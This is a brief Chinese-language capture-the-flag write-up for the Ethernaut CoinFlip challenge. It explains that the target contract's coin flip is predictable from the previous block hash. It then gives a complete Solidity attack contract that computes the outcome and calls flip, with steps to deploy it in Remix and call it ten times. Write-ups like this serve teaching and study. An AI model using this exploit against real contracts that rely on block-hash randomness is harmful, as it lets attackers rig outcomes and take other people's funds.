# 0 - Hello Ethernaut writeup

## 题目
[CoinFlip](https://ethernaut.openzeppelin.com)

## 笔记
源程序中设计了通过不同的区块号决定的不同值得出随机的硬币状态，但漏洞是如果我以一个合约去调用给出合约，那么第一个合约中查询到的区块序号便是
题目合约用到的区块序号，那么就有了如下破解合约：
```
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    import "./CoinFlip.sol";

    contract hack_CoinFlip {
        uint256 lastHash;
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip coinFlipInstance;
        constructor(address coinflip_address) {
            coinFlipInstance = CoinFlip(coinflip_address);
        }

        function hack_flip() public  {
            uint256 blockValue = uint256(blockhash(block.number - 1));

            if (lastHash == blockValue) {
                revert();
            }

            lastHash = blockValue;
            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;
            coinFlipInstance.flip(side);
        }
    }
```

通过 remix 部署上述合约，在部署时填入题目合约的地址即可成功部署，随后调用破解合约 10 次便成功完成破解